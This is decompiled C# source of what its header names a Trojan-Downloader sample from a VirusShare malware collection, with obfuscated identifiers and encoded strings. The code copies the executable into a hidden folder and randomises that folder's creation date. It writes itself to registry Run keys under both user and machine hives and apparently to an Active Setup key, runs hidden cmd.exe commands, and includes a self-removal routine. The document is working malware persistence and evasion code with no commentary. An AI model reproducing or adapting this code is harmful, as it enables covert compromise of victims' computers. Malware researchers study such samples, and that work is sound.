// Decompiled with JetBrains decompiler
// Type: ᥟޱഁेࠃᵷᣚ.ዽᓻᏃ܉տ
// Assembly: lgy, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F6858297-EDCC-46A7-BF64-CBC6BE6B3CD4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Downloader.MSIL.Crypted.ej-8021b1adb21670f837224cd99ccee8599abd7a84c7c3cf7b87df9da753a7739c.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;

namespace ᥟޱഁेࠃᵷᣚ
{
  internal class ዽᓻᏃ\u0709տ
  {
    public static void ᵭॊ\u0970ୋभḽᛛ()
    {
      ዽᓻᏃ\u0709տ.ڥᬕٌ\u05FFᬭҽ\u17DBᭁ();
      ዽᓻᏃ\u0709տ.ᬢᑊᛘᓜᥱ();
      ዽᓻᏃ\u0709տ.ԏᠶ\u16FBᶤᐑᄜ();
    }

    private static void ڥᬕٌ\u05FFᬭҽ\u17DBᭁ()
    {
      try
      {
        if (!Directory.Exists(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ἤუᔴ\u05C3))
          Directory.CreateDirectory(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ἤუᔴ\u05C3);
      }
      catch
      {
      }
      try
      {
        File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ἤუᔴ\u05C3, ґ.ᖢ(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᕽᕅ\u0C73, true)), true);
      }
      catch
      {
      }
      try
      {
        if (ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.\u0093\u08D9ሻჭ)
        {
          Random random = new Random();
          int day = random.Next(1, 28);
          int month = random.Next(1, 12);
          int year = random.Next(2000, DateTime.Now.Year);
          Directory.SetCreationTime(Path.Combine(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ἤუᔴ\u05C3, ґ.ᖢ(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᕽᕅ\u0C73, true)), new DateTime(year, month, day));
        }
      }
      catch
      {
      }
      if (ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.\u0DEE)
      {
        try
        {
          File.SetAttributes(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ἤუᔴ\u05C3, FileAttributes.Hidden | FileAttributes.NotContentIndexed);
        }
        catch
        {
        }
      }
      if (!ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.डத\u00A9Ẫ)
        return;
      try
      {
        File.SetAttributes(Path.Combine(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ἤუᔴ\u05C3, ґ.\u07C0ᵯ(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᕽᕅ\u0C73, true)), FileAttributes.Hidden | FileAttributes.NotContentIndexed);
      }
      catch
      {
      }
    }

    public static void ԏᠶ\u16FBᶤᐑᄜ()
    {
      try
      {
        if (ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.იዡิᣰ\u0E89̗ެ\u1CB0)
          Registry.CurrentUser.CreateSubKey(ґ.ᖢ("Xnpxf4JsfXBnWHRufXp+enF/Z2J0eQupK6ZveoJ+Z06AfX1weX9hcH1+dHp5Z12AeQ==", true)).SetValue(ґ.ᖢ(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᑫඖᥫϸ\u1AA9\u0E77᧕, true), (object) (ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ἤუᔴ\u05C3 + "\\" + ґ.ᖢ(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᕽᕅ\u0C73, true)));
      }
      catch
      {
      }
      try
      {
        if (ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.\u1C86ۂƼডಽ)
          Registry.LocalMachine.CreateSubKey(ґ.ᖢ("Xnpxf4JsfXBnWHRufXp+enF/Z2J0eQupK6ZveoJ+Z06AfX1weX9hcH1+dHp5Z12AeQ==", true)).SetValue(ґ.ᖢ(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᑫඖᥫϸ\u1AA9\u0E77᧕, true), (object) (ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ἤუᔴ\u05C3 + "\\" + ґ.ᖢ(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᕽᕅ\u0C73, true)));
      }
      catch
      {
      }
      try
      {
        if (!ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ầ\u05F4)
          return;
        RegistryKey subKey = Registry.LocalMachine.CreateSubKey(ґ.ᖢ("XlpRX2JMXVBnWHRufXp+enF/Z0xuf3SBcCsLqSumXnB/gHtnVHl+f2x3d3BvK056eHt6eXB5f35n", true) + ґ.ᖢ(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.މᆻƑሣū\u0011ሥыᯪ, true));
        subKey.SetValue("Xn+AbQupK6ZbbH9z", (object) (ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ἤუᔴ\u05C3 + "\\" + ґ.ᖢ(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᕽᕅ\u0C73, true)));
        subKey.SetValue("VH5UeX4LqSumf2x3d3Bv", (object) 1, RegistryValueKind.DWord);
      }
      catch
      {
      }
    }

    private static void ᬢᑊᛘᓜᥱ()
    {
      try
      {
        Process process = new Process();
        process.StartInfo = new ProcessStartInfo()
        {
          FileName = "cmd.exe",
          UseShellExecute = false,
          RedirectStandardInput = true,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        process.Start();
        StreamWriter standardInput = process.StandardInput;
        standardInput.WriteLine("cd " + ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ἤუᔴ\u05C3);
        standardInput.WriteLine(string.Format(ґ.ᖢ("cG5zeitmhXp5cF99bHl+cXB9aGV6eXBUTwupK6YrSCs9K0krhjuIRWVaWVA5dG9weX90cXRwfQ==", true), (object) ґ.ᖢ(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᕽᕅ\u0C73, true)));
        standardInput.Close();
        process.Kill();
      }
      catch
      {
      }
    }

    public static void Ĕÿ\u104EᤸᥫἛూ()
    {
      try
      {
        Registry.CurrentUser.CreateSubKey(ґ.ᖢ("Xnpxf4JsfXBnWHRufXp+enF/Z2J0eQupK6ZveoJ+Z06AfX1weX9hcH1+dHp5Z12AeQ==", true)).DeleteValue(ґ.ᖢ(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᑫඖᥫϸ\u1AA9\u0E77᧕, true));
      }
      catch
      {
      }
      try
      {
        Registry.LocalMachine.CreateSubKey(ґ.ᖢ("Xnpxf4JsfXBnWHRufXp+enF/Z2J0eQupK6ZveoJ+Z06AfX1weX9hcH1+dHp5Z12AeQ==", true)).DeleteValue(ґ.ᖢ(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.\u1316্ཬ, true));
      }
      catch
      {
      }
      try
      {
        Registry.LocalMachine.DeleteSubKey(ґ.ᖢ("XlpRX2JMXVBnWHRufXp+enF/Z0xuf3SBcCsLqSumXnB/gHtnVHl+f2x3d3BvK056eHt6eXB5f35n", true) + ґ.ᖢ(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.މᆻƑሣū\u0011ሥыᯪ, true));
      }
      catch
      {
      }
      try
      {
        switch (ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.\u05C5\u066CҼƹߛƹ)
        {
          case RegistryHive.CurrentUser:
            Registry.CurrentUser.DeleteSubKey(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᒳኣˋୣʎ\u1249ᯋĢ);
            break;
          case RegistryHive.LocalMachine:
            Registry.LocalMachine.DeleteSubKey(ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ᒳኣˋୣʎ\u1249ᯋĢ);
            break;
        }
      }
      catch
      {
      }
      ዽᓻᏃ\u0709տ.ᦌᕛ();
    }

    public static void ᦌᕛ()
    {
      try
      {
        string tempFileName = Path.GetTempFileName();
        File.Delete(tempFileName);
        File.Move(Process.GetCurrentProcess().MainModule.FileName, tempFileName);
        ᔂଋᦑ\u0FD4Ỉ\u0F3Dଫ.ŧຝ`\u0D55ਪᐬઑዧḵ(tempFileName, (string) null, ᔂଋᦑ\u0FD4Ỉ\u0F3Dଫ.\u194F.ኧᄶሳ);
      }
      catch (Exception ex)
      {
      }
    }

    public enum \u00B3ዪؤ
    {
      \u0340\u17F2ໄɑ,
      ᴖᡝ\u0DF4ᥝ\u16FF̆Ṩࢪ,
      ᗃᏼ,
    }
  }
}
